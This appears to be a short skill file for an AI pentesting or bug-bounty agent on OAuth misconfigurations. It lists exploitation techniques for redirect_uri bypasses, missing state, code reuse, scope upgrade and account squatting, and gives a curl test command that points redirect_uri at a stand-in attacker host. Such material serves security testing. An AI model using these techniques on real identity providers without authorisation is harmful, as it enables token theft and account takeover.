# SKILL: OAuth Misconfiguration

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (oauth misconfiguration) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
OAuth has 12+ classic misconfig patterns: redirect_uri lax matching, state missing/predictable, code reuse, auth-code-vs-token confusion, scope upgrade, client_secret leak, implicit flow + open redirect, account squatting via OAuth, OAuth in mobile webview without PKCE.

---

## DETECTION
Map authorize+callback. Tamper redirect_uri, state, scope. Test code reuse. Test PKCE absence on public clients.

## EXPLOITATION
- **redirect_uri** — `?redirect_uri=https://attacker.tld` if validation is loose. Variants: subdomain `attacker.target.com`, path `target.com/.attacker.tld`, query `target.com?next=attacker.tld`, fragment `target.com#@attacker.tld`. Open Redirect on whitelisted domain → token exfil.
- **state missing** → CSRF on OAuth callback → account hijack.
- **code reuse** → same `code` exchanged twice yields second access_token (some IdPs).
- **scope upgrade** → request `scope=admin` even if client default is `read`; AS may grant if not enforced.
- **PKCE missing** on public client (mobile/SPA) → code interception via deep link hijack.
- **Implicit flow + open redirect** = token in fragment; open redirect carries fragment; reflected in attacker domain via `Location:` chain.
- **Account squatting** — sign up via Google with a victim's email (no email verification on social sign-up); when victim later signs up, accounts merge → ATO.

## PAYLOADS (real, copy-paste, grouped)
(see exploitation)

## BYPASS TECHNIQUES
(see redirect_uri variants)

## CHAIN POTENTIAL
OAuth misconfig → token theft → ATO.

## TOOLS
Burp + Hackvertor; oauth-scout; manual repeater.

## COMMANDS
```bash
# Test redirect_uri
curl -sk "https://idp/auth?response_type=code&client_id=X&redirect_uri=https://attacker.tld&scope=openid&state=Y"
# Watch response Location header
```

## EDGE CASES / NOT-A-BUG TRAPS
Some IdPs do exact match — bypass requires registering attacker subdomain on whitelist domain or finding open redirect there.

## TRIAGE ANGLE (per platform)
Always show end-to-end ATO PoC.

## SEVERITY & CVSS
8.5–9.8.

## REFERENCES
PortSwigger OAuth • RFC 6749/6819 • Authzed OAuth pitfalls
